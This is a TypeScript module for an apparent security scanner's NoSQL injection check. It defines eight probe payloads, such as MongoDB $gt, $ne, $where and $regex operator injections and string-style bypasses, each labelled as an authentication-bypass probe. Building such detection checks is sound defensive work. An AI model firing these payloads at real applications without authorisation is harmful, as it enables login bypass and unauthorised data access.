// NoSQL injection active check family.
// Adapted from source-reference/vantix/secops/skills patterns.
// Rewritten in TypeScript with ProxyForge naming and types.
// No runtime dependency on vendored source.

import type { PayloadVariant } from '../types';

export const META = {
  id: 'nosql-injection',
  family: 'nosql-injection' as const,
  name: 'NoSQL Injection',
  description: 'Detects NoSQL injection in MongoDB and similar databases.',
  defaultRisk: 'none' as const,
  insertionPointKinds: ['query', 'body', 'json'],
};

const NOSQL_PROBES = [
  { value: '{"$gt":""}', intent: 'MongoDB $gt operator — selects all documents', signals: ['nosql-auth-bypass'] },
  { value: '{"$ne":"invalid"}', intent: 'MongoDB $ne operator — not-equal bypass', signals: ['nosql-auth-bypass'] },
  { value: '{"$regex":".*"}', intent: 'MongoDB $regex match-all', signals: ['nosql-auth-bypass'] },
  { value: '{"$where":"1==1"}', intent: 'MongoDB $where JavaScript evaluation', signals: ['nosql-auth-bypass'] },
  { value: '{"$or":[{},{"a":"b"}]}', intent: 'MongoDB $or with always-true condition', signals: ['nosql-auth-bypass'] },
  { value: "'||'1'=='1", intent: 'String-based NoSQL injection (CouchDB/Cassandra style)', signals: ['nosql-auth-bypass'] },
  { value: '; return true; var x=1', intent: 'JS-style NoSQL injection in where clause', signals: ['nosql-auth-bypass'] },
  { value: '{"$exists":true}', intent: 'MongoDB $exists — true for any field', signals: ['nosql-auth-bypass'] },
];

export function variants(): PayloadVariant[] {
  return NOSQL_PROBES.map((probe, i) => ({
    id: `nosql-${i + 1}`,
    family: 'nosql-injection' as const,
    value: probe.value,
    encoding: 'raw' as const,
    intent: probe.intent,
    requiresOast: false,
    requiresBrowser: false,
    destructiveRisk: 'none' as const,
    expectedSignals: probe.signals,
  }));
}
